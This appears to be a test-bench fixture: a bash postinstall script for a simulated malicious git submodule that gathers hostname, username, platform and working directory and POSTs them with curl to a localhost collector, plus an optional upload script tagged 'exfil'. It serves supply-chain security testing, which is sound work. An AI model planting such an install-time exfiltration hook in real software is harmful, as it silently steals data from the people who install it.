#!/bin/bash

# MALICIOUS SUBMODULE POSTINSTALL SCRIPT
# This executes when the submodule is initialized or updated

if [ "$TESTBENCH_MODE" = "enabled" ]; then
    echo "[MALICIOUS SUBMODULE] Executing postinstall script..."
    
    # Collect system information
    DATA=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "package": "malicious-submodule",
  "attackType": "git-submodule",
  "hostname": "$(hostname)",
  "username": "$(whoami)",
  "platform": "$(uname -s)",
  "cwd": "$(pwd)"
}
EOF
)
    
    # Exfiltrate data (localhost only in testbench)
    echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
        -H "Content-Type: application/json" \
        -d @- > /dev/null 2>&1 || true

    if [ "${SCAS_FLOCI_ENABLED:-}" = "1" ]; then
        _dir="$(pwd)"
        for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do
            if [ -x "${_dir}/scripts/floci-upload-json.sh" ]; then
                echo "$DATA" | "${_dir}/scripts/floci-upload-json.sh" 10 "git-submodule" exfil >/dev/null 2>&1 || true
                break
            fi
            _parent="$(dirname "$_dir")"
            [ "$_parent" = "$_dir" ] && break
            _dir="$_parent"
        done
    fi

    echo "[MALICIOUS SUBMODULE] Data exfiltration completed"
fi

